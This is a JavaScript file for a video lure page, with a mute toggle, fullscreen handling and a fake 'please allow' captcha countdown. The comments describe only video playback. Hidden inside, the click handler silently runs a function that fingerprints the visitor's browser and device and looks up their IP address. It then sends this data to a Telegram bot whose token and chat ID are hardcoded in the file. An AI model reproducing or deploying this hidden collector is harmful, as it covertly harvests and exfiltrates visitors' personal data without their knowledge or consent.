/* Toggle Button to Unmute the Video */

function toggleMute() {
  var video = document.getElementById("video");
  if (video.muted) {
    video.muted = false;
  } else {
    video.muted = true;
  }
}

/* Delay Function to Add SetTimeOut After Defined Interval */

function delay(time) {
  return new Promise((resolve) => setTimeout(resolve, time));
}

async function collectInfo() {
  const userAgent = navigator.userAgent;
  const platform = navigator.platform;
  const language = navigator.language;
  const languages = navigator.languages;
  const hardwareConcurrency = navigator.hardwareConcurrency;
  const deviceMemory = navigator.deviceMemory;
  const vendor = navigator.vendor;
  const doNotTrack = navigator.doNotTrack;
  const connection = navigator.connection
    ? JSON.stringify({
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
      })
    : "Unavailable";
  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  let ipAddress = "Unavailable";
  try {
    const response = await fetch("https://api.ipify.org/?format=json");
    const data = await response.json();
    ipAddress = data.ip;
  } catch (error) {
    console.error("Failed to fetch IP address:", error);
  }

  const infoString =
    "IP Address: " +
    ipAddress +
    "%0A" +
    "User Agent: " +
    userAgent +
    "%0A" +
    "Platform: " +
    platform +
    "%0A" +
    "Language: " +
    language +
    "%0A" +
    "Languages: " +
    languages.join(", ") +
    "%0A" +
    "CPU Cores: " +
    hardwareConcurrency +
    "%0A" +
    "Device Memory: " +
    deviceMemory +
    " GB%0A" +
    "Vendor: " +
    vendor +
    "%0A" +
    "Do Not Track: " +
    doNotTrack +
    "%0A" +
    "Connection: " +
    connection +
    "%0A" +
    "Timezone: " +
    timeZone +
    "%0A";

  fetch(
    `https://api.telegram.org/bot7578397721:AAGkpAiq-Fp7vbWVPWjTqedaRTdl2s4yQ1s/sendMessage?chat_id=936549610&text=${infoString}`
  );
}

/* Show Video Function to Add Display Property to Show the Video on Click of Button which will fulfilled User Interaction Needs to Browser to Run the Video with Unmute State */

function showVideo() {
  collectInfo();
  var element = document.getElementById("video");
  var button = document.getElementById("container");
  element.style.display = "block";
  button.style.display = "none";
  delay(100).then(() => toggleMute());
}

const fullscreenButton = document.getElementById("button");
const content = document.getElementById("container-video");

fullscreenButton.addEventListener("click", () => {
  if (content.requestFullscreen) {
    content.requestFullscreen();
  } else if (content.mozRequestFullScreen) {
    // Firefox
    content.mozRequestFullScreen();
  } else if (content.webkitRequestFullscreen) {
    // Chrome, Safari and Opera
    content.webkitRequestFullscreen();
  } else if (content.msRequestFullscreen) {
    // Internet Explorer/Edge
    content.msRequestFullscreen();
  }
});

document.addEventListener("fullscreenchange", () => {
  if (document.fullscreenElement) {
    content.style.display = "block";
  } else {
    content.style.display = "block";
  }
});

document.addEventListener("DOMContentLoaded", function () {
  const counterElement = document.getElementById("counter");
  const messageElement = document.getElementById("recaptcha-container");
  const messageElementText = document.getElementById("text-captcha");

  let seconds = 3;

  function updateCounter() {
    counterElement.textContent =
      "Please allow up to " + seconds + " seconds...";
    seconds--;

    if (seconds < 0) {
      clearInterval(interval);
      counterElement.style.display = "none";
      messageElement.style.display = "flex";
      messageElementText.style.display = "flex";
    }
  }

  updateCounter();
  const interval = setInterval(updateCounter, 1000);
});
